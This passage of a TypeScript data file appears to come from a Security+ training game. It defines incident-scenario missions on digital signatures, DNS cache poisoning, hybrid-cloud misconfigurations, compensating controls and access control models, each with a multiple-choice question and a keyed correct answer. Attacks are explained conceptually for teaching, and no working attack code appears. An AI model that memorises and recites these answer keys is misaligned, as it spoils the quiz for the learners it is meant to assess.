import { Mission } from '../types';

export const missions: Mission[] = [

  // ============================================================
  // DOMAIN 1 — General Security Concepts (Obj 1.2)
  // Teaches: Digital Signatures, Integrity, CIA Triad
  // ============================================================
  {
    id: 'MISSION-001',
    title: 'The Broken Seal',
    domain: 'General Security Concepts',
    objectiveCodes: ['1.2'],
    threatLevel: 'high',
    tags: ['Cryptography', 'Integrity', 'Digital Signatures', 'CIA Triad'],
    briefing: 'PRIORITY ALERT: Your company automatically adds digital signatures to all outgoing emails. This morning, three clients called — they received invoices from your organization with modified bank routing numbers. The invoices look legitimate, but the payment details redirect funds to an unknown account. Finance is panicking. Your CISO needs you to figure out what happened and how the signatures failed to prevent this.',

    intel: [
      {
        id: 'seal-01',
        type: 'log',
        label: 'Email Gateway Logs',
        content: 'Outgoing mail logs show all invoices left the server with valid digital signatures attached. The signature process works like this: the system creates a hash (a unique fixed-length fingerprint) of the entire email body using SHA-256. It then encrypts that hash with the company\'s private key. The result is the digital signature. When a recipient gets the email, their client decrypts the signature using your public key and compares the hash to a fresh hash of the message. If they match, the message is intact. If not, it was altered.\n\nGateway status: All 47 outgoing invoices today — SIGNATURE VALID at send time.',
        critical: true
      },
      {
        id: 'seal-02',
        type: 'forensic',
        label: 'Forensic Comparison',
        content: 'Side-by-side analysis of the original invoice vs. the version the client received:\n\n  ORIGINAL: Routing #091000019 | Acct #4458-7721\n  RECEIVED: Routing #061092387 | Acct #8834-2290\n\nThe body text was modified after leaving your server. Because the content changed, the SHA-256 hash of the received message no longer matches the hash embedded in the digital signature. The client\'s email software flagged this: "SIGNATURE VERIFICATION FAILED — message may have been altered."\n\nKey concept: A digital signature provides INTEGRITY (proof the message wasn\'t changed) and NON-REPUDIATION (proof of who sent it). It does NOT provide CONFIDENTIALITY — the email content is still readable in plaintext. An attacker who intercepts the email can read and modify it, but they cannot re-sign it without your private key.',
        critical: true
      },
      {
        id: 'seal-03',
        type: 'report',
        label: 'Network Analysis',
        content: 'The security team has identified the attack vector: a man-in-the-middle position on a compromised mail relay between your server and the client\'s domain. The attacker intercepted emails in transit, modified the routing numbers, and forwarded them. They could read the content (no encryption was applied — signatures don\'t encrypt) and alter it. However, they could NOT forge a valid signature because they don\'t possess your company\'s private key.\n\nThis reveals the difference between the CIA Triad properties:\n  - CONFIDENTIALITY: Preventing unauthorized reading (requires encryption)\n  - INTEGRITY: Detecting unauthorized modification (digital signatures do this)\n  - AVAILABILITY: Ensuring systems stay operational\n\nYour signatures correctly detected the tampering. The failure was that clients ignored the verification warning.',
        critical: false
      },
      {
        id: 'seal-04',
        type: 'witness',
        label: 'Client Statement',
        content: '"We got the invoice and it looked completely normal — same letterhead, same contact info. Our email showed a small yellow warning that said \'digital signature could not be verified\' but our accounting department didn\'t know what that meant, so they processed the payment anyway. We\'ve since learned that warning meant the message had been tampered with."',
        critical: false
      },
      {
        id: 'seal-05',
        type: 'alert',
        label: 'SIEM Correlation',
        content: 'Timeline reconstruction:\n  14:02 — Invoice batch sent (47 emails, all signed)\n  14:03 — Signatures verified VALID at gateway exit\n  14:08 — MitM relay intercepted 3 invoices to high-value clients\n  14:09 — Routing numbers modified in email body\n  14:09 — Modified emails forwarded to clients (signature now INVALID)\n  14:15 — Client mail servers received emails with failed signature checks\n  14:22 — Accounting at Client A processes payment (ignored warning)\n\nThe digital signature system WORKED — it detected every modification. The breach occurred because the human recipients didn\'t understand or act on the integrity warning.',
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, the digital signatures on these emails primarily protect which property of the CIA Triad?',
      options: [
        'Confidentiality — the signatures encrypt the message content',
        'Integrity — the signatures detect unauthorized modifications',
        'Availability — the signatures ensure email delivery',
        'Authentication — the signatures verify the recipient\'s identity'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: Digital signatures do NOT encrypt message content. The emails were readable in plaintext. Encryption (confidentiality) is a separate mechanism.',
        'CORRECT: Digital signatures create a hash of the message and sign it with the sender\'s private key. Any modification to the message changes the hash, causing signature verification to fail. This is integrity — detecting unauthorized changes.',
        'INCORRECT: Availability means systems remain operational and accessible. Digital signatures have no effect on email delivery.',
        'INCORRECT: Digital signatures verify the SENDER\'s identity (non-repudiation), not the recipient\'s. But the primary property they protect is integrity — proving the message wasn\'t altered.'
      ]
    },

    debrief: 'This incident demonstrates CompTIA Objective 1.2: the CIA Triad. Digital signatures protect INTEGRITY — they mathematically prove whether a message has been modified. The process: hash the message with SHA-256, encrypt the hash with the sender\'s private key. Recipients decrypt with the public key and compare hashes. If they don\'t match, the message was tampered with.\n\nCritical distinction: signatures prove tampering (integrity) but don\'t prevent reading (confidentiality). For confidentiality, you need encryption. The clients\' email systems correctly flagged the invalid signatures — the real failure was human: ignoring a security warning they didn\'t understand.',

    escalation: 'Because the accounting teams ignored the signature warnings, $127,000 was wired to the attacker\'s account across three transactions. The funds have been flagged but recovery is uncertain. Your company now faces both financial loss and a mandatory breach disclosure to affected clients.',

    refs: [
      { source: 'Study Guide', section: '1.2 - The CIA Triad', page: 2 },
      { source: 'Study Guide', section: '1.4 - Hashing and Digital Signatures', page: 14 }
    ]
  },

  // ============================================================
  // DOMAIN 2 — Threats, Vulnerabilities, Mitigations (Obj 2.4)
  // Teaches: DNS Poisoning, DNS resolution, DNSSEC
  // ============================================================
  {
    id: 'MISSION-002',
    title: 'The Phantom Redirect',
    domain: 'Threats, Vulnerabilities, Mitigations',
    objectiveCodes: ['2.4'],
    threatLevel: 'critical',
    tags: ['DNS', 'Network Attacks', 'Spoofing', 'Cache Poisoning'],
    briefing: 'CRITICAL ALERT: First National Bank\'s online portal has experienced a 40% drop in legitimate traffic over the past 3 hours. The help desk is flooded — customers are calling to report that the banking site "looks slightly different" and asked them to re-enter their full credentials, SSN, and card numbers. Some customers say their browser showed a certificate warning they clicked through. Your SOC team needs you to investigate immediately.',

    intel: [
      {
        id: 'dns-01',
        type: 'alert',
        label: 'DNS Monitoring Alert',
        content: 'ANOMALY DETECTED: The bank\'s domain "firstnational.com" is resolving to IP 185.234.72.11 instead of the legitimate server at 203.0.113.50.\n\nBackground — how DNS works: When a user types "firstnational.com" in their browser, their computer asks a DNS server to translate that domain name into an IP address. The DNS server checks its cache (a temporary store of recent lookups) first. If it has a cached answer, it responds immediately without checking the authoritative server. This cache is what makes DNS fast — but it\'s also what makes it vulnerable.\n\nThe cached record for firstnational.com was updated at 14:32 UTC. The new IP (185.234.72.11) points to a server in Eastern Europe, not your datacenter.',
        critical: true
      },
      {
        id: 'dns-02',
        type: 'log',
        label: 'DNS Server Cache Dump',
        content: 'Cache entry analysis:\n\n  firstnational.com.  IN  A  185.234.72.11  (TTL: 86400)\n  — Inserted: 14:32:07 UTC\n  — Source: Spoofed response from 10.0.0.99\n  — Expected authoritative source: ns1.firstnational.com (198.51.100.1)\n\nThe cache was poisoned. In a DNS Cache Poisoning attack, an attacker injects a fraudulent DNS response into the resolver\'s cache. The resolver stores this fake answer and serves it to every user who queries that domain. Since DNS operates on UDP (connectionless — no handshake verification), it\'s relatively easy to forge responses.\n\nResult: Every customer whose DNS query hits this poisoned cache gets directed to 185.234.72.11 instead of the real bank server. The attacker set a TTL (Time To Live) of 86400 seconds (24 hours), meaning this bad record will persist in the cache for an entire day unless manually flushed.',
        critical: true
      },
      {
        id: 'dns-03',
        type: 'forensic',
        label: 'Packet Capture Analysis',
        content: 'Network capture from 14:32 UTC shows the attack in action:\n\n  14:32:05 — Legitimate DNS query sent to resolver for firstnational.com\n  14:32:06 — SPOOFED response arrives from attacker (forged source IP)\n  14:32:07 — Resolver accepts spoofed response (arrived first)\n  14:32:08 — Real authoritative response arrives (DISCARDED — cache already populated)\n\nThis is a classic DNS race condition. The attacker floods the resolver with forged responses, trying to beat the real server. DNS resolvers accept the FIRST valid-looking response they receive. Because UDP has no built-in sender verification, the resolver can\'t tell the difference between a real and forged response.\n\nThe forged response contained:\n  - Correct transaction ID (attacker guessed or observed it)\n  - Matching query section\n  - Fraudulent answer: A record pointing to attacker\'s server',
        critical: false
      },
      {
        id: 'dns-04',
        type: 'report',
        label: 'Threat Intelligence Brief',
        content: 'DNS POISONING (also called DNS Cache Poisoning or DNS Spoofing)\n\nAttack summary: Corrupts the DNS name resolution process by injecting false records into a DNS resolver\'s cache. Legitimate domain names then resolve to attacker-controlled IP addresses.\n\nCommon indicators:\n  - Unexpected changes in DNS resolution results\n  - User complaints about site appearance or behavior\n  - Certificate warnings (attacker can\'t get a valid cert for victim\'s domain)\n  - Traffic flowing to unexpected IP ranges\n\nPrimary countermeasure: DNSSEC (DNS Security Extensions) adds digital signatures to DNS records. The authoritative server signs its responses with a private key, and resolvers verify the signature before accepting records. A forged response without a valid DNSSEC signature gets rejected.\n\nOther mitigations:\n  - Randomize source ports and transaction IDs (makes forging harder)\n  - Use DNS over HTTPS (DoH) or DNS over TLS (DoT) for encrypted queries\n  - Reduce cache TTL values to limit poison duration\n  - Monitor DNS resolution for anomalies',
        critical: false
      },
      {
        id: 'dns-05',
        type: 'witness',
        label: 'Customer Reports',
        content: 'Customer #1: "I typed firstnational.com like always. The site loaded but asked me to \'verify my identity\' by entering my SSN and full card number. I got suspicious and called you."\n\nCustomer #2: "My browser showed a warning — something about the security certificate being invalid. I clicked \'Continue anyway\' because I was in a hurry. The site looked almost right but the login page had a different font."\n\nCustomer #3: "I didn\'t notice anything wrong. I logged in normally. But now there are three transactions I didn\'t make."\n\nNote: The certificate warning occurred because the attacker\'s server at 185.234.72.11 cannot present a valid SSL certificate for firstnational.com — they don\'t control that domain\'s certificate authority chain. Observant users would catch this.',
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, what countermeasure should be deployed FIRST to stop this attack and prevent recurrence?',
      options: [
        'Deploy a web application firewall to filter malicious DNS traffic',
        'Flush the DNS cache and implement DNSSEC validation',
        'Block all inbound traffic from external IP ranges',
        'Enable full-disk encryption on the DNS server'
      ],
      correctIndex: 1,
      rationales: [
        'INCORRECT: A WAF protects web applications from HTTP-level attacks (XSS, SQL injection). It does not operate at the DNS resolution layer and cannot prevent cache poisoning.',
        'CORRECT: Flushing the cache removes the poisoned records immediately, restoring correct resolution. DNSSEC adds cryptographic signatures to DNS responses — the resolver verifies signatures before accepting records, preventing future forged responses from being cached.',
        'INCORRECT: Blocking all inbound traffic would cause a denial of service to legitimate users and does not address the DNS resolution problem.',
        'INCORRECT: Full-disk encryption protects data at rest on the server\'s drives. It has zero effect on DNS cache contents or network-level poisoning attacks.'
      ]
    },

    debrief: 'This was a DNS Cache Poisoning attack (CompTIA Objective 2.4). The attacker exploited DNS\'s reliance on UDP (no sender verification) to inject a forged response into your resolver\'s cache. Every customer query then resolved to the attacker\'s phishing server instead of the real bank.\n\nKey concepts learned:\n  - DNS translates domain names to IP addresses using cached lookups\n  - DNS cache poisoning replaces legitimate cached records with attacker-controlled ones\n  - UDP\'s connectionless nature makes DNS responses easy to forge\n  - DNSSEC adds digital signatures to DNS, cryptographically validating responses\n  - Certificate warnings are a key indicator — attackers can\'t forge valid SSL certs for domains they don\'t own',

    escalation: 'The poisoned cache served false records for 3 additional hours. 847 customers entered credentials on the attacker\'s phishing site. 12 accounts showed unauthorized transactions totaling $89,000. The bank must now issue a mandatory breach disclosure under financial regulations, and customers are demanding answers about why DNS wasn\'t secured with DNSSEC — an industry standard.',

    refs: [
      { source: 'Study Guide', section: '2.4 - DNS Attacks', page: 33 },
      { source: 'Study Guide', section: '2.4 - On-path Attacks', page: 34 }
    ]
  },

  // ============================================================
  // DOMAIN 3 — Security Architecture (Obj 3.1)
  // Teaches: Hybrid Cloud, Security Mismatches, Shared Responsibility
  // ============================================================
  {
    id: 'MISSION-003',
    title: 'The Cloud Divide',
    domain: 'Security Architecture',
    objectiveCodes: ['3.1'],
    threatLevel: 'high',
    tags: ['Cloud', 'Hybrid', 'Architecture', 'Segmentation'],
    briefing: 'SECURITY AUDIT FINDINGS: Your company migrated 40% of workloads to AWS six months ago while keeping financial systems on-premises. A third-party security audit just landed on your desk flagged "HIGH RISK" — they found multiple gaps where security policies between the two environments don\'t align. The CTO wants your assessment before the board meeting tomorrow morning.',

    intel: [
      {
        id: 'cloud-01',
        type: 'report',
        label: 'Audit: Firewall Comparison',
        content: 'FINDING: Critical policy mismatches between on-premises and cloud security controls.\n\nOn-premises firewall rules (Palo Alto):\n  - DENY all inbound except ports 80, 443 (web)\n  - DENY all outbound except whitelisted destinations\n  - IPS enabled, logging to SIEM\n\nAWS Security Groups:\n  - ALLOW SSH (port 22) from 0.0.0.0/0 (ANY source IP)\n  - ALLOW ICMP from 0.0.0.0/0\n  - ALLOW ports 80, 443, 8080, 3306 from 0.0.0.0/0\n  - 15 EC2 instances have public IPs with no WAF\n\nIn a hybrid cloud deployment, security controls exist in BOTH environments — physical/virtual firewalls on-prem, and security groups + NACLs (Network Access Control Lists) in the cloud. A "network protection mismatch" occurs when these policies don\'t align. Your on-prem is locked down, but your cloud is wide open.\n\nThis is the most common security consideration unique to hybrid cloud: maintaining consistent security posture across environments with fundamentally different control mechanisms.',
        critical: true
      },
      {
        id: 'cloud-02',
        type: 'forensic',
        label: 'Infrastructure Topology',
        content: 'NETWORK DIAGRAM ANALYSIS:\n\nA site-to-site VPN tunnel connects the on-prem datacenter to the AWS VPC (Virtual Private Cloud). Traffic flows bidirectionally through this tunnel.\n\nThe problem: An attacker who compromises the more permissive cloud environment can traverse the VPN tunnel into the locked-down on-prem network. The VPN is a bridge — it connects the two environments at the network level. Strong on-prem controls don\'t help if the cloud side is porous.\n\nHybrid cloud architecture inherits the security weaknesses of its WEAKEST environment. Think of it as a house with a reinforced steel front door but a screen door in the back — the attacker goes through the screen door.\n\nCloud shared responsibility model:\n  - Cloud provider (AWS) secures: Physical datacenter, hypervisor, network infrastructure\n  - YOU secure: OS configuration, security groups, IAM policies, data encryption, application code\n\nThe audit found that the migration team "lifted and shifted" workloads without applying equivalent security controls in the cloud environment.',
        critical: true
      },
      {
        id: 'cloud-03',
        type: 'log',
        label: 'CloudTrail / IAM Review',
        content: 'AWS Configuration Issues Found:\n\n  1. CloudTrail logging enabled but NOT forwarded to on-prem SIEM\n     — Cloud activity is invisible to the security operations center\n     — On-prem SOC monitors on-prem only; blind to cloud events\n\n  2. IAM Policies: 3 service accounts have AdministratorAccess\n     — Violates principle of least privilege\n     — One account hasn\'t been used in 4 months (orphaned)\n\n  3. No MFA on AWS console access for 7 developer accounts\n     — Password-only access to cloud management console\n\n  4. S3 buckets: 2 buckets with "Block Public Access" DISABLED\n     — Potential data exposure\n\nCloud environments require equivalent controls to on-prem: centralized logging, least privilege IAM, MFA enforcement, public access restrictions. Simply moving workloads to the cloud without replicating security controls creates blind spots.',
        critical: false
      },
      {
        id: 'cloud-04',
        type: 'alert',
        label: 'Incident History',
        content: 'PREVIOUS INCIDENT (32 days ago):\n\nA developer\'s AWS access key was found on a public GitHub repository. The key had S3 read/write permissions and EC2 launch capabilities.\n\nTimeline:\n  — Key pushed to GitHub at 09:14\n  — Automated scanner detected exposed key at 11:45 (2.5 hours later)\n  — Key revoked at 14:20 (5 hours of exposure)\n  — No alert was triggered in the SOC because CloudTrail logs weren\'t being monitored\n\nIf CloudTrail had been forwarded to the SIEM, unusual API calls from an unknown IP would have triggered an alert within minutes, not hours. This is a direct consequence of the hybrid visibility gap — cloud activity existing outside the security monitoring perimeter.',
        critical: false
      }
    ],

    challenge: {
      question: 'What is the MOST significant security concern unique to this hybrid cloud deployment?',
      options: [
        'Microservice outages affecting application availability',
        'IoT device management across cloud boundaries',
        'Network protection mismatches between on-prem and cloud',
        'Container backup failures during migration'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: Microservice reliability is a concern in any cloud deployment (pure cloud, hybrid, or multi-cloud). It\'s not unique to hybrid architecture.',
        'INCORRECT: IoT management is its own domain challenge. It\'s not specific to hybrid cloud deployments.',
        'CORRECT: Hybrid cloud uniquely creates the risk of inconsistent security controls between environments. On-prem and cloud use different mechanisms (firewalls vs. security groups), and maintaining equivalent policies across both is the primary hybrid challenge. The VPN bridge means the weakest environment exposes both.',
        'INCORRECT: Container backups are a general DevOps operational concern, not unique to hybrid architecture.'
      ]
    },

    debrief: 'This investigation covers CompTIA Objective 3.1: Cloud Infrastructure. A hybrid cloud combines on-premises and public cloud environments — and the biggest challenge is maintaining consistent security across both.\n\nKey concepts learned:\n  - Hybrid clouds inherit the weaknesses of their most permissive environment\n  - VPN tunnels bridge networks, so a cloud compromise can reach on-prem\n  - The shared responsibility model means YOU secure everything above the hypervisor\n  - Cloud security groups ≠ on-prem firewall rules — both need equivalent hardening\n  - Centralized logging (SIEM integration) must cover ALL environments\n  - "Lift and shift" migrations without security review create dangerous gaps',

    escalation: 'The board meeting went poorly. The CTO was asked why SSH is open to the internet on production servers and why the leaked access key incident wasn\'t detected for 5 hours. Two board members demanded an immediate cloud security remediation plan with a $200K emergency budget. The security team has 30 days to close every gap identified in the audit.',

    refs: [
      { source: 'Study Guide', section: '3.1 - Cloud Infrastructures', page: 42 },
      { source: 'Study Guide', section: '3.1 - Infrastructure Considerations', page: 45 }
    ]
  },

  // ============================================================
  // DOMAIN 4 — Security Operations (Obj 4.3)
  // Teaches: Compensating Controls, Vulnerability Management, Segmentation
  // ============================================================
  {
    id: 'MISSION-004',
    title: 'The Unpatched Four',
    domain: 'Security Operations',
    objectiveCodes: ['4.3'],
    threatLevel: 'critical',
    tags: ['Vulnerability Management', 'Compensating Controls', 'Segmentation', 'Patching'],
    briefing: 'URGENT: Internal audit just discovered four production servers running your core financial application that haven\'t been patched in over 14 months. Yesterday, the vendor disclosed a critical remote code execution vulnerability (CVE-2024-31847, CVSS 9.1) affecting exactly this software version. Your patch team estimates 2 weeks minimum to test and deploy the fix without breaking the application. Threat intelligence confirms active exploitation in the wild. The CISO needs an immediate risk mitigation plan — you have hours, not weeks.',

    intel: [
      {
        id: 'patch-01',
        type: 'alert',
        label: 'Vulnerability Scan Report',
        content: 'SCAN RESULTS — Priority: CRITICAL\n\nCVE-2024-31847 affects all 4 servers:\n  - FIN-APP-01 (10.10.10.21) — VULNERABLE\n  - FIN-APP-02 (10.10.10.22) — VULNERABLE\n  - FIN-APP-03 (10.10.10.23) — VULNERABLE\n  - FIN-APP-04 (10.10.10.24) — VULNERABLE\n\nCVSS Score: 9.1 / 10 (Critical)\n  - Attack Vector: Network (exploitable remotely)\n  - Attack Complexity: Low (no special conditions needed)\n  - Privileges Required: None (unauthenticated)\n  - Impact: Full system compromise (RCE)\n\nAbout CVSS: The Common Vulnerability Scoring System rates vulnerabilities on a 0-10 scale. Scores above 9.0 are "Critical" — meaning remote, unauthenticated attackers can fully compromise the system with little effort. This is as bad as it gets.\n\nAbout vulnerability scanning: Scanners compare installed software versions against databases of known vulnerabilities (CVEs). They identify what\'s vulnerable but don\'t fix anything — that\'s the remediation step.',
        critical: true
      },
      {
        id: 'patch-02',
        type: 'forensic',
        label: 'Network Architecture Review',
        content: 'CURRENT TOPOLOGY:\n\nAll 4 financial servers sit on VLAN 10 (Corporate LAN) — the same network segment as 200+ employee workstations, printers, and IoT devices. No firewall rules restrict lateral movement between workstations and these servers.\n\nThis means: If ANY workstation on VLAN 10 is compromised (phishing email, malicious download, USB attack), the attacker can directly reach the vulnerable financial servers on the same network. There is zero segmentation.\n\nNetwork Segmentation creates isolated zones using VLANs (Virtual LANs) and firewall ACLs (Access Control Lists). Critical servers should be on their own VLAN with strict rules:\n  - DENY all inbound by default\n  - ALLOW only specific ports from specific management IPs\n  - ALLOW application traffic only from the load balancer\n  - LOG all connection attempts\n\nSegmentation is a compensating control — it doesn\'t fix the vulnerability, but it drastically reduces the attack surface by limiting who can reach the vulnerable systems while you work on the actual patch.',
        critical: true
      },
      {
        id: 'patch-03',
        type: 'report',
        label: 'Change Management History',
        content: 'TIMELINE OF PATCHING DELAYS:\n\n  — 14 months ago: Last successful patch cycle for FIN-APP servers\n  — 12 months ago: Vendor released update, but regression testing broke a reporting module. Patch rolled back.\n  — 8 months ago: Change Advisory Board (CAB) approved a temporary exception: "Defer patching until vendor resolves compatibility issue"\n  — Exception was supposed to be reviewed in 90 days. It was never reviewed.\n  — 2 months ago: Vendor released compatible patch. No one reopened the exception ticket.\n  — Yesterday: Critical CVE disclosed for unpatched version.\n\nCompensating controls are security measures used when the primary control (patching) isn\'t feasible. They\'re meant to be TEMPORARY — you implement them to reduce risk while working toward the real fix. The CAB exception should have mandated compensating controls (like segmentation) for the interim period. Instead, the servers sat unpatched AND unsegmented for over a year.',
        critical: false
      },
      {
        id: 'patch-04',
        type: 'intercepted',
        label: 'Threat Intelligence Feed',
        content: 'ACTIVE EXPLOITATION CONFIRMED:\n\n  Source: CISA Known Exploited Vulnerabilities Catalog\n  Status: CVE-2024-31847 added to KEV list 48 hours ago\n  Exploitation: Confirmed in the wild by multiple threat actors\n  Typical attack pattern:\n    1. Internet-wide scan for vulnerable service (port 8443)\n    2. Send crafted payload (no authentication needed)\n    3. Achieve remote code execution\n    4. Deploy ransomware or establish persistent backdoor\n  Average time from scan to exploitation: 72 hours\n\nYour servers aren\'t directly internet-facing, but any compromised workstation on the same VLAN becomes the launch point. A phishing email to any employee on VLAN 10 could be the first step in an attack chain that reaches these servers.',
        critical: false
      }
    ],

    challenge: {
      question: 'Patching will take 2 weeks. What is the BEST immediate action to protect these four servers?',
      options: [
        'Purchase cybersecurity insurance to cover potential breach costs',
        'File a risk exception to formally accept the vulnerability',
        'Move the servers to an isolated network segment with strict ACLs',
        'Commission a third-party penetration test to validate the risk'
      ],
      correctIndex: 2,
      rationales: [
        'INCORRECT: Cyber insurance transfers financial risk but does nothing to prevent the breach. It doesn\'t reduce the technical attack surface — the servers remain exploitable.',
        'INCORRECT: A risk exception formally documents acceptance of risk, but it doesn\'t mitigate anything. With active exploitation confirmed, accepting a CVSS 9.1 vulnerability without compensating controls is negligent.',
        'CORRECT: Network segmentation is the best compensating control here. Moving the servers to an isolated VLAN with deny-all ACLs prevents lateral movement from compromised workstations. Only authorized management IPs and application traffic are allowed through. This buys time for proper patch testing while drastically reducing the attack surface.',
        'INCORRECT: A penetration test takes time to scope, execute, and report — time you don\'t have. It confirms the risk (already confirmed by the CVE) but doesn\'t mitigate it.'
      ]
    },

    debrief: 'This incident covers CompTIA Objective 4.3: Vulnerability Remediation. When patching isn\'t immediately possible, compensating controls fill the gap.\n\nKey concepts learned:\n  - CVSS scores rate vulnerability severity (9.0+ = Critical)\n  - Vulnerability scanners identify weaknesses; remediation fixes them\n  - Compensating controls are temporary measures when primary controls fail\n  - Network segmentation (VLANs + ACLs) isolates vulnerable systems\n  - Change management exceptions MUST include compensating controls and review dates\n  - Flat networks (no segmentation) let attackers move laterally from any compromised device\n  - The best immediate response to an unpatchable critical vuln is to reduce who can reach it',

    escalation: 'Without segmentation, the servers remain on the flat corporate network. Three days later, an employee clicks a phishing link, and the attacker pivots from the compromised workstation to FIN-APP-01 using the published exploit. Ransomware encrypts all four financial servers and 14 months of transaction data. Recovery takes 3 weeks. The breach costs $2.1M in downtime, incident response, and regulatory fines.',

    refs: [
      { source: 'Study Guide', section: '4.3 - Vulnerability Remediation', page: 67 },
      { source: 'Study Guide', section: '2.5 - Segmentation and Access Control', page: 40 }
    ]
  },

  // ============================================================
  // DOMAIN 5 — Governance, Risk, Compliance (Obj 5.4)
  // Teaches: Access Control Models (DAC, MAC, RBAC, ABAC)
  // ============================================================
  {
    id: 'MISSION-005',
    title: 'The Open Files',
    domain: 'Governance, Risk, Compliance',
    objectiveCodes: ['5.4'],
    threatLevel: 'medium',
    tags: ['IAM', 'Access Control', 'DAC', 'RBAC', 'Governance'],
    briefing: 'POST-INCIDENT REVIEW: A departing project lead, Jane Dawson, had shared access to sensitive project files with 12 colleagues — including 4 people in Marketing who had no business need for the data. One of those Marketing users accidentally attached an internal product roadmap to a client email. The product roadmap contained unreleased pricing and feature plans. Management wants to know: how did Marketing get access to restricted project files, and which access control model would prevent this from happening again?',

    intel: [
      {
        id: 'acl-01',
        type: 'log',
        label: 'File Server Audit Log',
        content: 'ACCESS CONTROL CHANGES — Project_Roadmap_2025.xlsx:\n\n  Owner: jdawson (Project Lead, Engineering)\n  Created: 2024-08-15\n\n  Permission grants by jdawson:\n  2024-08-15: GRANTED Read/Write to bsmith (Engineering)\n  2024-08-20: GRANTED Read/Write to tchang (Engineering)\n  2024-09-01: GRANTED Read to mlopez (Marketing) — "she asked to see it"\n  2024-09-03: GRANTED Read to kroberts (Marketing)\n  2024-09-03: GRANTED Read to pnguyen (Marketing)\n  2024-09-15: GRANTED Read to jpark (Marketing) — "CC\'d on the email chain"\n  ... 8 more grants across 3 departments\n\nAll permissions were set directly by jdawson using Windows file sharing (right-click > Properties > Sharing). No approval workflow. No manager sign-off. No audit review.\n\nThis is Discretionary Access Control (DAC) in action: the data OWNER decides who gets access at their own discretion. The file system lets any owner share with any user. There are no system-enforced restrictions based on department, role, or clearance level.',
        critical: true
      },
      {
        id: 'acl-02',
        type: 'report',
        label: 'HR / Offboarding Report',
        content: 'OFFBOARDING REVIEW — Jane Dawson (jdawson):\n\nWhen jdawson departed the company:\n  - Her account was disabled (standard procedure)\n  - BUT: All 47 files she shared retained the permissions she had set\n  - No one reviewed or revoked the sharing permissions\n  - New users she added were never validated against a need-to-know list\n\nDAC WEAKNESS: Permissions persist even after the granting user leaves. The access decisions died with her account, but the access itself lived on.\n\nCompare this with Role-Based Access Control (RBAC):\n  - Access is tied to JOB ROLES, not individual discretion\n  - "Engineering" role gets access to engineering files\n  - "Marketing" role gets access to marketing files\n  - When someone changes roles or departments, their access automatically adjusts\n  - No individual user can grant arbitrary access — it\'s controlled by role assignment\n\nWith RBAC, jdawson could never have shared engineering files with Marketing users. The system would enforce role boundaries regardless of what any individual user wants to do.',
        critical: true
      },
      {
        id: 'acl-03',
        type: 'report',
        label: 'Access Control Models Reference',
        content: 'FOUR ACCESS CONTROL MODELS (CompTIA Security+ Exam Objective):\n\n1. DAC — Discretionary Access Control\n   - The data OWNER controls access\n   - Owner can share with anyone at their discretion\n   - Most flexible, least secure\n   - Common in: Windows file sharing, personal systems\n   - Risk: Over-sharing, no enforcement of need-to-know\n\n2. MAC — Mandatory Access Control\n   - The SYSTEM controls access using classification labels\n   - Data gets labels: Top Secret, Secret, Confidential, Unclassified\n   - Users get clearance levels\n   - Users CANNOT change permissions — only admins with proper authority can\n   - Common in: Military, government, intelligence agencies\n   - Most rigid, most secure\n\n3. RBAC — Role-Based Access Control\n   - Access is determined by JOB ROLE\n   - Users are assigned roles (Engineer, Manager, Analyst)\n   - Roles have predefined permission sets\n   - Changing roles automatically changes access\n   - Most common in: Enterprise/corporate environments\n   - Good balance of security and manageability\n\n4. ABAC — Attribute-Based Access Control\n   - Access based on ATTRIBUTES: user role + location + time + device + data sensitivity\n   - Example: "Allow access only from corporate network, during business hours, from managed devices"\n   - Most granular and context-aware\n   - Common in: Cloud environments, zero-trust architectures',
        critical: false
      },
      {
        id: 'acl-04',
        type: 'witness',
        label: 'Interview: Marketing User',
        content: 'Interview with mlopez (Marketing):\n\n"Jane sent me the roadmap file when I asked about upcoming features for a marketing campaign. She just right-clicked the file, went to sharing, and added my name. Took her 10 seconds. I didn\'t think there was a process — she owned the file so she could share it with whoever she wanted."\n\n"I forwarded it to the client because I thought it was approved marketing material. There was no classification label on it, no \'INTERNAL ONLY\' watermark, nothing telling me it was restricted. In my old company, files had labels like \'Confidential\' and the system wouldn\'t let you email them externally."',
        critical: false
      },
      {
        id: 'acl-05',
        type: 'alert',
        label: 'Data Loss Prevention Log',
        content: 'DLP SYSTEM: No policy triggered.\n\nThe DLP system is configured to block files containing credit card numbers and SSNs. It has NO rules for:\n  - Internal classification labels (none exist)\n  - Restricted file shares being attached to external emails\n  - Department-boundary violations\n\nA properly configured DLP system combined with RBAC or MAC would have:\n  1. Classified the roadmap file as "Internal — Engineering Only"\n  2. Blocked mlopez from attaching it to an external email\n  3. Alerted the security team about the attempted policy violation\n\nWithout classification labels and role-based controls, the DLP system had no basis to block the file.',
        critical: false
      }
    ],

    challenge: {
      question: 'Based on your investigation, which access control model was in use that allowed this unauthorized sharing?',
      options: [
        'Discretionary Access Control — the owner decided who gets access',
        'Mandatory Access Control — system labels controlled access',
        'Role-Based Access Control — job roles determined permissions',
        'Attribute-Based Access Control — contextual attributes governed access'
      ],
      correctIndex: 0,
      rationales: [
        'CORRECT: DAC lets the data owner (jdawson) grant access to anyone at their discretion. There were no system-enforced restrictions — she simply right-clicked and shared. This flexibility is DAC\'s defining feature and its greatest weakness.',
        'INCORRECT: MAC uses system-enforced classification labels (Top Secret, Confidential, etc.). Users cannot change permissions. The investigation showed no labels existed and jdawson freely shared files — the opposite of MAC.',
        'INCORRECT: RBAC assigns permissions based on job roles. If RBAC were in use, Marketing users could never access Engineering files regardless of what jdawson wanted. The investigation showed jdawson overrode department boundaries at will.',
        'INCORRECT: ABAC uses contextual attributes (location, time, device, role) to make access decisions. The investigation showed no attribute-based policies — access was purely at the owner\'s discretion.'
      ]
    },

    debrief: 'This incident illustrates CompTIA Objective 5.4: Access Controls. The company used Discretionary Access Control (DAC), where file owners decide who gets access — no system enforcement, no role boundaries, no classification labels.\n\nKey concepts learned:\n  - DAC: Owner-controlled, flexible, risky. Common in Windows file sharing.\n  - MAC: System-controlled with classification labels. Used in military/government. Users can\'t change permissions.\n  - RBAC: Role-based. Most common in enterprise. Access tied to job function, not individual choice.\n  - ABAC: Attribute-based. Most granular. Considers context (location, time, device).\n  - The right model depends on the organization: government uses MAC, enterprises use RBAC, modern cloud uses ABAC.\n  - DAC fails when users don\'t understand data sensitivity or when there\'s no oversight of sharing decisions.',

